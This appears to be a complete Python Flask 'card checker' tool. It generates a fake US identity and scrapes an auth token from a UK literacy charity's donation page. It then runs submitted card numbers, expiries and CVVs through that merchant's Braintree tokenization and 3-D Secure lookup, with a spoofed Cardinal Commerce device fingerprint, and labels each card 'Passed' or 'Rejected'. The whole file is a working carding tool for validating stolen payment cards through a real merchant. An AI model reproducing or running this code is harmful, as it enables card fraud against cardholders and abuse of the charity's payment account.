from flask import Flask, render_template, request
import requests
from faker import Faker
import random
import json
from get_token import extract_auth_token

app = Flask(__name__, template_folder='.')

fake = Faker("en_US")
domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]

def fetch_city_zipcode_data():
    url = "https://raw.githubusercontent.com/AbderrezakLzone/country-map/refs/heads/main/US/state.json"
    try:
        # Send a request to fetch the file
        response = requests.get(url)

        if response.status_code == 200:
            # Convert the content into JSON
            return response.json()
        else:
            print(f"ERROR: FAILED TO FETCH CITY ZIPCODE DATA {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"ERROR: FAILED TO FETCH CITY ZIPCODE DATA {e}")
        return False

def generate_random_person():

    # Use the function to fetch the data
    city_zipcode_data = fetch_city_zipcode_data()
    if not city_zipcode_data:
        return False

    state_name = random.choice(list(city_zipcode_data.keys()))
    city_name = random.choice(list(city_zipcode_data[state_name].keys()))
    zipcode = city_zipcode_data[state_name][city_name]
    
    phone = fake.phone_number()

    phone = phone.replace("(", "").replace(")", "").replace(" ", "").replace("-", "")
    if phone[:3] != zipcode[:3]:
        phone = f"({zipcode[:3]})-{phone[3:6]}-{phone[6:]}"

    return {
        'firstname': fake.first_name(),
        'lastname': fake.last_name(),
        'username': fake.user_name()[:10],
        'password': fake.password(),
        'email': f"{fake.user_name()[:10]}@{random.choice(domains)}",
        'phone': phone,
        'city': city_name,
        'country': "United States",
        'state': state_name,
        'zipcode': zipcode,
        'address': fake.street_address(),
        'useragent': fake.user_agent(),
    }

def get_token(card, month, year, cvv, random_person, authorization):
    headers = {
        'authorization': f'Bearer {authorization}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'user-agent': random_person['useragent'],
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': fake.uuid4(),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': f'{card}',
                    'expirationMonth': f'{month}',
                    'expirationYear': f'{year}',
                    'cvv': f'{cvv}',
                    'billingAddress': {
                        'postalCode': random_person['zipcode'],
                        'streetAddress': random_person['city'],
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).text

    return response

# Send POST request with random data
def post_dfReferenceId(random_person):
    url = "https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData"
    ReferenceId = f"0_{fake.uuid4()}"
    
    payload = {
        "Cookies": {
            "Legacy": True,
            "LocalStorage": True,
            "SessionStorage": True
        },
        "DeviceChannel": "Browser",
        "Extended": {
            "Browser": {
                "Adblock": True,
                "AvailableJsFonts": [],
                "DoNotTrack": "unknown",
                "JavaEnabled": False,
            },
            "Device": {
                "ColorDepth": 24,
                "Cpu": "unknown",
                "Platform": "Linux aarch64",
                "TouchSupport": {
                    "MaxTouchPoints": 5,
                    "OnTouchStartAvailable": True,
                    "TouchEventCreationSuccessful": True
                }
            }
        },
        "Fingerprint": "0620f62ea9af60d44f7aba455d72f1e0",
        "FingerprintingTime": 904,
        "FingerprintDetails": {
            "Version": "1.5.1"
        },
        "Language": random.choice(["en-DZ", "en-US", "fr-FR"]),
        "Latitude": None,
        "Longitude": None,
        "OrgUnitId": "5c88277e791eef31e828a5b7",
        "Origin": "Songbird",
        "Plugins": [],
        "ReferenceId": ReferenceId,
        "Referrer": "",
        "Screen": {
            "FakedResolution": False,
            "Ratio": 2.2222222222222223,
            "Resolution": f"{random.randint(800, 1920)}x{random.randint(600, 1080)}",
            "UsableResolution": f"{random.randint(800, 1920)}x{random.randint(600, 1080)}",
            "CCAScreenSize": "01"
        },
        "CallSignEnabled": None,
        "ThreatMetrixEnabled": False,
        "ThreatMetrixEventType": "PAYMENT",
        "ThreatMetrixAlias": "Default",
        "TimeOffset": -60,
        "UserAgent": random_person['useragent'],
        "UserAgentDetails": {
            "FakedOS": False,
            "FakedBrowser": False
        },
        "BinSessionId": fake.uuid4()
    }

    headers = {
        'User-Agent': random_person['useragent'],
        'Content-Type': "application/json",
        'x-requested-with': "XMLHttpRequest",
        'origin': "https://geo.cardinalcommerce.com",
        'accept-language': "en-DZ,en-US;q=0.9,en;q=0.8",
        'Cookie': "__cfruid=0af84ea54f18cc801ea3c0d1964a1b4364eda10d-1734549356"
    }

    response = requests.post(url, data=json.dumps(payload), headers=headers)
    return ReferenceId
    
def check_card(token, random_person, card, authorization):
    url = f"https://api.braintreegateway.com/merchants/458w85bw8sbvhtfc/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
    dfReferenceId = post_dfReferenceId(random_person)

    payload = {
        "amount": 500,
        "additionalInfo": {
            "acsWindowSize": "03",
            "billingLine1": random_person['address'],
            "billingLine2": "",
            "billingPostalCode": random_person['zipcode'],
            "billingCountryCode": "US",
            "billingGivenName": random_person['firstname'],
            "billingSurname": random_person['lastname'],
            "email": random_person['email']
        },
        "bin": card[:6],
        "dfReferenceId": dfReferenceId,
        "clientMetadata": {
            "requestedThreeDSecureVersion": "2",
            "sdkVersion": "web/3.99.0",
            "cardinalDeviceDataCollectionTimeElapsed": 104,
            "issuerDeviceDataCollectionTimeElapsed": 784,
            "issuerDeviceDataCollectionResult": True
        },
        "authorizationFingerprint": authorization,
        "braintreeLibraryVersion": "braintree/web/3.99.0",
        "_meta": {
            "merchantAppId": "literacytrust.org.uk",
            "platform": "web",
            "sdkVersion": "3.99.0",
            "source": "client",
            "integration": "custom",
            "integrationType": "custom",
            "sessionId": fake.uuid4()
        }
    }

    headers = {
        'User-Agent': random_person['useragent'],
        'Content-Type': "application/json",
        'origin': "https://literacytrust.org.uk",
    }

    response = requests.post(url, data=json.dumps(payload), headers=headers)

    if "threeDSecureInfo" in response.text:
        data = response.json()
        status = data.get("paymentMethod", {}).get("threeDSecureInfo", {}).get("status", "ERROR")
        return status
    else:
        print(f"ERROR: FAILED TO FETCH DATA {response.text}")
        return f"ERROR: FAILED TO FETCH DATA"
    
PASSED = '𝗣𝗮𝘀𝘀𝗲𝗱 ✅'
REJECTED = '𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌'
ERROR = '𝙀𝙍𝙍𝙊𝙍 ⚠️'

def process_payment(card, month, year, cvv):
    try:
        random_person = generate_random_person()
        if not random_person:
            return "ERROR: FAILED TO FETCH CITY ZIPCODE DATA"
        authorization = extract_auth_token("https://literacytrust.org.uk/donate/one-off/")
        if not random_person:
            print(authorization)
            return "ERROR: EXTRACT AUTH TOKEN"
        token_result = get_token(card, month, year, cvv, random_person, authorization)
        if 'tokencc_b' in token_result:
            data = json.loads(token_result)
            token = data['data']['tokenizeCreditCard']['token']
            result = check_card(token, random_person, card, authorization)
            return result
        else:
            print(f"ERROR: FAILED TO GETTING TOKEN {token_result}")
            return "ERROR: FAILED TO GETTING TOKEN"

    except Exception as e:
        print(f"ERROR: {e}")
        return f"ERROR: Unknown"
    
def parse_response(card, month, year, cvv):
    response = process_payment(card, month, year, cvv)
    if "ERROR" in response:
        return ERROR, response

    # Format response
    formatted_response = ' '.join(word.capitalize() for word in response.split('_'))
    if "Successful" in formatted_response:
        return PASSED, formatted_response
    
    if formatted_response in ["Lookup Card Error", "Lookup Error"]:
        return ERROR, formatted_response

    return REJECTED, formatted_response

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        card_number = request.form['card_number']
        exp_month = request.form['exp_month']
        exp_year = request.form['exp_year']
        cvv = request.form['cvv']

        status, response = parse_response(card_number, exp_month, exp_year, cvv)
        return render_template('result.html', status=status, response=response)

    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)